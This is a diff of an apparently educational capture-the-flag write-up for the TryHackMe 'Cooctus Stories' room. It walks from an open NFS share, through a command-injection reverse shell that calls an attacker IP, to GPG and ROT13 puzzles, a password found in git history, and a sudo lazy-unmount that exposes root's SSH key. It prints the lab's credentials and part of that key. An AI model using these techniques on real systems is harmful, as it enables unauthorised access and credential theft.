@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cooctus Stories: an NFS leak and a sudo unmount escape to root</title>
-  <meta name="description" content="A TryHackMe Cooctus Stories walkthrough: an open NFS share leaking credentials, a ROT13 puzzle, exposed git history, and privilege escalation by abusing sudo rights over a mount command.">
+  <meta name="description" content="A TryHackMe Cooctus Stories walkthrough: an open NFS share leaking credentials, a command-injection foothold, a GPG and ROT13 puzzle chain, a password recovered from git history, and a lazy unmount that exposes root's SSH key.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -13,16 +13,16 @@
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
   <h1>Cooctus Stories: an NFS leak and a sudo unmount escape to root</h1>
-  <p class="dek">An open NFS export hands over credentials with no authentication at all, git history exposes more than a careless commit, and a narrowly scoped sudo rule over a mount command turns out to be a way to read the entire filesystem as root.</p>
+  <p class="dek">An open NFS export hands over plaintext credentials with no authentication at all. From there: a "test your exploit" web tool that just runs whatever you type, a GPG-and-ROT13 puzzle chain, a password sitting in old git history, and a sudo-permitted unmount that turns out to reveal root's own SSH key hiding underneath a decoy filesystem.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Cooctus Stories</span>
     <span class="pill">Category: Web / Linux Privesc</span>
-    <span class="pill">Tools: showmount, git log, sudo -l</span>
+    <span class="pill">Tools: showmount, gpg, git, sudo</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> an NFS share nobody locked down, a git repository with history still intact, and a sudo rule that looks harmless in isolation. The job: chain all three into root.</p>
+    <p><strong>The setup:</strong> an NFS share with no access control, a web "attack troubleshooter" that takes raw input a little too literally, and a filesystem mount trick hiding the real prize underneath a fake one. The job: chain all of it to a root shell.</p>
   </div>
 
   <section>
@@ -32,13 +32,20 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Enumerate and mount the open NFS share</div>
-          <p>NFS is open with no authentication. Listing and mounting the export hands over its contents directly:</p>
-          <pre><code>showmount -e &lt;target&gt;
-mkdir /tmp/nfs &amp;&amp; sudo mount -t nfs &lt;target&gt;:/&lt;share&gt; /tmp/nfs</code></pre>
+          <div class="step-title">Mount the open NFS share and read what's on it</div>
+          <p><code>showmount -e</code> lists any exports the target is serving with no authentication required:</p>
+          <pre><code>showmount -e 10.10.96.187
+Export list for 10.10.96.187:
+/var/nfs/general *</code></pre>
+          <p>Mounting it locally (after making a folder to mount it into) makes its contents appear as ordinary local files:</p>
+          <pre><code>sudo mount -t nfs 10.10.96.187:/var/nfs/general ~/Desktop/general -o nolock</code></pre>
+          <p>Inside sits a single file, <code>credentials.bak</code>, 31 bytes:</p>
+          <pre><code>cat credentials.bak
+paradoxial.test
+ShibaPretzel79</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>NFS exports are often configured by IP/hostname trust rather than credentials. An export with no restriction means anyone who can reach the port can read (or write) its contents as if they were local files.</p>
+            <p>NFS exports are often trusted by IP/hostname rather than credentials. A <code>*</code> in the export list means any client can mount it, and whatever's inside is handed over exactly as if it were a local file.</p>
           </div>
         </div>
       </div>
@@ -46,11 +53,15 @@ mkdir /tmp/nfs &amp;&amp; sudo mount -t nfs &lt;target&gt;:/&lt;share&gt; /tmp/n
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Decode a small cipher puzzle</div>
-          <p>Among the mounted files sits a short string that isn't quite readable, a classic ROT13 rotation. Decoding it by hand or with a quick tool reveals a hint pointing at where to look next.</p>
+          <div class="step-title">Log in, then abuse a "test your exploit" box</div>
+          <p>The recovered credentials work on a login page on port 8080. Behind it sits the <strong>Cooctus Attack Troubleshooter (C.A.T)</strong>, a tool that invites you to "test your exploits in a safe environment" by typing a payload into a text box and submitting it. Feeding it a reverse shell redirect does exactly what it looks like it would:</p>
+          <pre><code>&gt;/dev/tcp/10.2.57.21/4444 &lt;&amp;1'</code></pre>
+          <p>That lands a shell as a real service account:</p>
+          <pre><code>szymex@cchq:/$ id
+uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>ROT13 isn't security, it's obfuscation meant to avoid spoiling a hint at a glance, not to resist a determined read. Recognizing the "every letter looks slightly wrong but the word shapes are right" pattern is usually enough to spot it instantly.</p>
+            <p>A "safe sandbox" for testing exploit strings is only sandboxed if the input is actually isolated from a real shell. Here it wasn't, the submitted text reached a real <code>/bin/sh</code> context on a real account, in the <code>testers</code> group no less.</p>
           </div>
         </div>
       </div>
@@ -58,14 +69,22 @@ mkdir /tmp/nfs &amp;&amp; sudo mount -t nfs &lt;target&gt;:/&lt;share&gt; /tmp/n
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Pull credentials out of git history</div>
-          <p>A project directory on the share turns out to be a git repository. The current files look clean, but the commit history tells a different story:</p>
-          <pre><code>git log --all --oneline
-git diff &lt;commit-1&gt; &lt;commit-2&gt;</code></pre>
-          <p>An earlier commit contains a credential that was later removed from the working tree, but never purged from history.</p>
+          <div class="step-title">Enumerate what the testers group can see</div>
+          <p>Being a member of <code>testers</code> means a targeted filesystem search turns up everything that group can read, instead of guessing paths one at a time:</p>
+          <pre><code>find / -group testers -ls 2&gt;/dev/null
+
+791866  drwxrwx---  2 tux testers  /home/tux/tuxling_3
+791869  -rwxrwx---  1 tux testers  /home/tux/tuxling_3/note
+655438  drwxrwx---  2 tux testers  /home/tux/tuxling_1
+655541  -rw-rw----  1 tux testers  /home/tux/tuxling_1/nootcode.c
+655698  -rw-rw----  1 tux testers  /home/tux/tuxling_1/note
+655535  drwxrwx---  2 tux testers  /media/tuxling_2
+655450  -rw-rw-r--  1 tux testers  /media/tuxling_2/private.key
+655545  -rw-rw----  1 tux testers  /media/tuxling_2/note
+655463  -rw-rw-r--  1 tux testers  /media/tuxling_2/fragment.asc</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Deleting a secret in a new commit doesn't delete it from the repository, it's still sitting in every prior commit unless history itself is rewritten and force-pushed. <code>git log</code> and <code>git diff</code> across commits are standard first moves whenever a <code>.git</code> directory is reachable.</p>
+            <p><code>find -group</code> turns "what can this group access" into a single command instead of trial-and-error directory listing, and it surfaces files (a <code>.asc</code> encrypted fragment, a private key) that are clear next steps on sight.</p>
           </div>
         </div>
       </div>
@@ -73,13 +92,19 @@ git diff &lt;commit-1&gt; &lt;commit-2&gt;</code></pre>
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Check sudo rights after logging in</div>
-          <p>The recovered credentials work over SSH. Once logged in, checking what the account is allowed to run as root is the very next move:</p>
-          <pre><code>sudo -l</code></pre>
-          <p>The account can run <code>mount</code> (and its counterpart <code>umount</code>) as root, with no further restriction on arguments.</p>
+          <div class="step-title">Decrypt the GPG fragment</div>
+          <p>The private key imports cleanly, then decrypts the fragment sitting next to it:</p>
+          <pre><code>gpg --import private.key
+gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
+gpg: key B70EB31F8EF3187C: secret key imported
+
+gpg --decrypt fragment.asc
+gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
+      "TuxPingu"
+The second key fragment is: 6eaf62818d</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p><code>sudo -l</code> is the single highest-value command to run on any freshly obtained shell. A narrowly named command in a sudoers entry can still be a full privilege escalation if that command is powerful enough on its own, mount and unmount absolutely qualify.</p>
+            <p>A private key found sitting unprotected next to the file it decrypts isn't really encryption at that point, it's an extra step. The two-command <code>--import</code> then <code>--decrypt</code> pattern is the standard way to use any recovered GPG keypair.</p>
           </div>
         </div>
       </div>
@@ -87,14 +112,109 @@ git diff &lt;commit-1&gt; &lt;commit-2&gt;</code></pre>
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Abuse mount/umount for a root filesystem view</div>
-          <p>Unmounting a bind-mounted restricted directory, then remounting the real root filesystem over an accessible mount point, exposes the entire disk, including <code>/root</code>, to the current unprivileged user.</p>
-          <pre><code>sudo umount /some/restricted/mount
-sudo mount --bind / /mnt</code></pre>
-          <p>From there, a private SSH key sitting in root's home directory grants a direct, fully privileged login.</p>
+          <div class="step-title">Reverse a ROT13 password-recovery script</div>
+          <p>One of the other notes is a small Python program that ROT13-encodes a candidate password and compares it against a target string, printing the plaintext once it matches. Stepping through it by hand (or in a debugger) against the encrypted target <code>"pureelpbxr"</code> against the charset <code>"qwertyuiopasdfghjklzxcvbnm"</code> recovers the password one character at a time, landing on <code>cherrycoke</code>.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Mount operations don't just attach new filesystems, they can remount or rebind existing ones in ways that bypass whatever restriction put them there in the first place. Sudo access to mount is effectively sudo access to the entire filesystem.</p>
+            <p>ROT13 is its own inverse, applying it twice returns the original text. Once the script's ROT13 logic is understood, there's no need to run the program at all, the target string can just be decoded directly.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Run the sudo-permitted script as the next user</div>
+          <p><code>szymex</code> can run a specific script as user <code>varg</code>:</p>
+          <pre><code>sudo -u varg /home/varg/CoocOS.py</code></pre>
+          <p>It boots a fake splash screen and mounts a filesystem:</p>
+          <pre><code>[  OK  ] Cold boot detected. Flux Capacitor powered up
+[  OK  ] Mounted Cooctus Filesystem under /opt
+[  OK  ] Finished booting sequence
+CoocOS 13.3.7 LTS cookie tty1</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A sudo rule scoped to one specific script still runs with that script's full logic, including whatever filesystem operations it performs. The joke splash screen is a distraction from the fact that a real mount just happened under <code>/opt</code>.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Pull varg's password out of exposed git history</div>
+          <p>Inside <code>varg</code>'s home sits a hidden <code>.git</code> directory with its revision history still intact:</p>
+          <pre><code>cat .git/logs/HEAD
+0000...0000 6919df5c171460507f69769bc20e19bd0838b74d Vargles <varg@cchq.noot> ...  commit (initial): Created git repo for CoocOS
+6919df5c... 8b8daa41120535c569d0b99c6859a1699227d086 Vargles <varg@cchq.noot> ...  commit: Removed CooctOS login script for now
+
+git diff 8b8daa41120535c569d0b99c6859a1699227d086 6919df5c171460507f69769bc20e19bd0838b74d</code></pre>
+          <p>The diff shows the removed login script in full, including a hardcoded check:</p>
+          <pre><code>+for i in range(0,2):
++    if pw != "slowroastpork":
++        pw = input("Password: ")
++    else:
++        if uname == "varg":
++            os.setuid(1002)
++            os.setgid(1002)
++            pty.spawn("/bin/rbash")</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Removing a file in a later commit doesn't erase it from history, <code>git diff</code> between two commit hashes from the reflog shows exactly what changed, including a plaintext password that was never meant to stay reachable.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">8</div>
+        <div class="step-body">
+          <div class="step-title">Lazy-unmount the decoy filesystem</div>
+          <p>Logged in as <code>varg</code>, <code>sudo -l</code> shows one permitted command:</p>
+          <pre><code>sudo -l
+User varg may run the following commands on cchq:
+    (root) NOPASSWD: /bin/umount</code></pre>
+          <p><code>df -ha</code> confirms <code>/opt/CooctFS</code> is a real, sizeable mount, not just the splash-screen simulation from step 6. A plain unmount and a forced one both fail because the mount is in use, but a lazy unmount succeeds:</p>
+          <pre><code>df -ha | grep opt
+/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.5G   12G  37%  /opt/CooctFS
+
+sudo /bin/umount /opt/CooctFS
+umount: /opt/CooctFS: target is busy.
+sudo /bin/umount -f /opt/CooctFS
+umount: /opt/CooctFS: target is busy.
+sudo /bin/umount -l /opt/CooctFS</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A lazy unmount (<code>-l</code>) detaches the mount point immediately even while it's busy, deferring actual cleanup until nothing references it anymore. The important part isn't the flag itself, it's what unmounting reveals next.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">9</div>
+        <div class="step-body">
+          <div class="step-title">Find root's SSH key hiding underneath the mount</div>
+          <p>With the overlay detached, the directory underneath it, previously hidden by whatever was mounted over it, is exposed:</p>
+          <pre><code>cd /opt/CooctFS
+ls -la
+drwxr-xr-x 5 root root 4096 Feb 20 09:16 root
+
+cd root
+ls -la
+-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
+drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
+
+cd .ssh
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
+...</code></pre>
+          <p>Saved locally, chmod'd to 600, and used directly:</p>
+          <pre><code>chmod 600 rsaprivatekey
+ssh -i rsaprivatekey root@10.10.136.2
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Mounting something over a directory doesn't delete what's underneath, it just hides it from view until the mount is removed. A "decoy OS" mounted over root's real home directory was never actually protecting it, just obscuring it from a user who never thought to unmount it.</p>
           </div>
         </div>
       </div>
@@ -104,13 +224,18 @@ sudo mount --bind / /mnt</code></pre>
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>showmount: open NFS export found, no auth required
-  &rarr; mounted share: a ROT13-encoded hint found
-       &rarr; decoded hint: points to a git repository on the share
-            &rarr; git log/diff: a removed credential still sits in history
-                 &rarr; SSH login with the recovered credential
-                      &rarr; sudo -l: unrestricted mount/umount rights
-                           &rarr; remount root filesystem: root's SSH key exposed</code></pre>
+    <pre><code>showmount -e: open NFS export, no auth
+  &rarr; mounted share: credentials.bak leaks a username/password
+       &rarr; web login (port 8080) &rarr; C.A.T tool executes raw input
+            &rarr; reverse shell as szymex (testers group)
+                 &rarr; find -group testers: a GPG fragment and an encoded note
+                      &rarr; GPG decrypt: a key fragment recovered
+                      &rarr; ROT13 reversed by hand: varg's CoocOS password
+                           &rarr; sudo -u varg CoocOS.py: mounts /opt/CooctFS
+                                &rarr; varg's .git history: an old script leaks varg's real password
+                                     &rarr; sudo -l: NOPASSWD umount
+                                          &rarr; lazy unmount: decoy filesystem detached
+                                               &rarr; root's SSH key exposed underneath &rarr; root shell</code></pre>
   </section>
 
   <section>
@@ -118,20 +243,24 @@ sudo mount --bind / /mnt</code></pre>
     <div class="skills">
       <div class="skill">
         <div class="skill-title">NFS exports need the same scrutiny as any network share</div>
-        <p>An export with no IP or auth restriction is effectively a public read (or write) of whatever it serves.</p>
+        <p>An export with no IP or auth restriction is effectively a public read of whatever it serves, this room's entire chain started from one.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">A "safe sandbox" is only safe if the input is actually isolated</div>
+        <p>A tool inviting users to test exploit strings needs to actually sandbox what it executes, not just imply that it does.</p>
       </div>
       <div class="skill">
         <div class="skill-title">Git history outlives the files you meant to protect</div>
-        <p>A secret removed in a later commit is still recoverable from the repository's history unless that history itself is rewritten.</p>
+        <p>A password removed in a later commit is still sitting in every prior commit unless history itself is rewritten.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Narrow-sounding sudo rules deserve a second look</div>
-        <p><code>sudo -l</code> is step one on any new shell. A single permitted command, if powerful enough, is a full privilege escalation on its own.</p>
+        <div class="skill-title">A mount is a cover, not a deletion</div>
+        <p>Mounting one filesystem over a sensitive directory hides it, it doesn't protect it. Whoever can unmount it gets to see what was underneath the whole time.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via NFS enumeration, git history recovery, and sudo mount abuse</footer>
+  <footer>tryhackme.com &middot; solved via NFS enumeration, a sandbox escape, git history recovery, and a lazy unmount</footer>
 
 </div>
 </body>
